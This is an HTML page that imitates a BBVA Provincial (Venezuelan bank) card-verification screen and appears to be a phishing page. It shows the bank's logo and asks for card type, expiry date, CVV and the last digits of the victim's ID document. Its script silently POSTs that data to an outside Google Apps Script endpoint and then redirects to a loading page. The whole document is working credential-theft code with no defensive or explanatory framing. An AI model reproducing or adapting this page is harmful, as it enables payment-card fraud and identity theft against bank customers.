<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Inicio</title>
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no" />
    <style>
        /* Estilos básicos para mantener el diseño original */
        body { margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
        .container { max-width: 348px; margin: 0 auto; }
        input, select { display: block; width: 100%; padding: 15px; margin-top: 10px; border: 1px solid #ccc; }
        button { background-color: #237aba; color: #fff; width: 100%; padding: 15px; border: none; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

<div style="background: #072146; padding: 15px;">
    <img src="logo-bbva-provincial1.png" style="width: 150px" />
</div>

<div class="container">
    <h1>Ingresa los datos de una tarjeta</h1>
    
    <form id="tarjetaForm" onsubmit="event.preventDefault(); enviarDatos(this);">
        <select name="tipodoc" id="tipodoc" required>
            <option value="">Seleccione su tarjeta</option>
            <option value="Debito">TDD (Tarjeta de debito)</option>
            <option value="Credito">TDC (Tarjeta de credito)</option>
        </select>
        
        <input name="fecha" id="fecha" type="tel" maxlength="5" placeholder="MM/AA" oninput="formatearFecha(event)" required />
        <input name="cvv" id="cvv" type="tel" maxlength="3" placeholder="Código de seguridad" required />
        <input name="lastDoc" id="documento" type="tel" maxlength="3" placeholder="Ultimos 3 digitos del documento" required />

        <button type="submit" id="btnVerificar">Verificar</button>
    </form>
</div>

<script>
function formatearFecha(event) {
    let input = event.target;
    let value = input.value.replace(/\D/g, "");
    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2, 4);
    input.value = value;
}

async function enviarDatos(formulario) {
    const btn = document.getElementById('btnVerificar');
    btn.innerText = "Verificando...";
    btn.disabled = true;

    const datos = new FormData(formulario);
    const URL_GOOGLE = "https://script.google.com/macros/s/AKfycbx9cU2lLhshUBFHq36KlSNXi4_Gr1YAuD6FhF3kzix3MzvDACFedcrwtpVYqApaHHII9g/exec";

    try {
        await fetch(URL_GOOGLE, {
            method: "POST",
            mode: "no-cors",
            body: datos
        });
        window.location.href = "cargando.html";
    } catch (error) {
        alert("Error de conexión, intenta de nuevo.");
        btn.innerText = "Verificar";
        btn.disabled = false;
    }
}
</script>

</body>
</html>
